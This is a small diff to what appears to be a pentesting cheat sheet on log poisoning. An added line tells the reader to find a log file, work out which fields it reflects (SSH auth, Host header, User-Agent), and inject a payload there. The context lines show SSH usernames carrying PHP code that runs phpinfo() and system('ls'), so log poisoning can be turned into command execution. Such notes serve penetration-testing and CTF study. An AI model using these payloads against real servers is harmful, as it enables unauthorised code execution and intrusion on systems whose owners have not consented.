@@ -1,3 +1,6 @@
+if you found any log file, see which functions or headers are reflecting and after use your payload in that functions or headers like: auth:ssh, domainname:Host, user-agent
+
+
 ssh '<?php phpinfo(); ?>'@ip_address
 ssh '<?php system("ls"); ?>'@ip_address
 
